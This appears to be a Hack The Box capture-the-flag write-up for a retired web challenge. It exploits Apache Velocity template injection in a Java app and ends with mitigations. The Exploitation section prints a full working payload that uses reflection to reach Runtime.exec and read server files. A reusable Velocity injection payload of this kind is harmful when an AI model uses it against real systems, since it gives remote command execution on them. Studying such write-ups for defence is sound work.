---
challenge: Labyrinth Linguist
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, java, velocity, ssti, rce]
---

# Labyrinth Linguist — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Solved challenge; no real flags.

## TL;DR

A **Java 11** app that "translates" user text by building an **Apache Velocity 1.7** template from it. `#set` creates objects and, through reflection, reaches `Runtime.exec`: **SSTI** with command execution.

## Brief

A form with a text field returning the "translation". The source (Maven, `Main.java`) ships in the challenge ZIP; the flag is copied to `/flag.txt` and the `Dockerfile` **renames** it to `/flag<random>.txt`, so the directory must be listed.

## Recon

```bash
curl -s http://<IP>:<PORT>/ | head -40
# POST with text=<...>
curl -s -X POST http://<IP>:<PORT>/ -d 'text=$name'
```

If `$name` returns `World`, the input is evaluated as a Velocity template: the challenge context defines that variable.

## The flaw

Velocity is not Jinja or Twig: syntax is `#set($var = ...)` and it can reach Java classes. The classic vector is `$class.inspect(...)`, but `$class` is not exposed in this build. The working route gets `Class` from a **string** and calls `forName`:

```text
#set($x = '')
#set($rt = $x.class.forName('java.lang.Runtime'))
```

## Exploitation

```text
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ch=$x.class.forName('java.lang.Character'))#set($p=$rt.getRuntime().exec('ls /'))#set($br=$x.class.forName('java.io.BufferedReader'))#set($isr=$x.class.forName('java.io.InputStreamReader'))#set($r=$br.getConstructor($isr).newInstance($p.getInputStream()))$r.readLine()
```

The response carries the command's first line. `ls /` reveals `flagXXXXXXXXXX.txt`; repeat with:

```text
... .exec('cat /flagXXXXXXXXXX.txt') ...
```

URL-encode the payload (`#` → `%23`) when sent by `GET`; over `POST` it goes in the body.

## Evidence

- Trimmed command output; no flags.
- Real values live in `private/`.

## Lessons

- **`$class` is not always there**: when the sandbox blocks it, `''.class.forName(...)` still yields `Class`.
- **`readLine()` reads one line**: for more output, repeat or `cat` a single file.
- **The flag is not where it looks**: the `Dockerfile` renames it; list `/`.
- **`#` in the URL**: unencoded, the fragment is dropped and the payload never arrives.

- Velocity is SSTI too: the engine need not be Jinja or Twig.
- Java reflection is execution: any reachable `Class.forName` is RCE.
- Mitigation: templates fixed on disk, a data context and `SecureUberspector`.
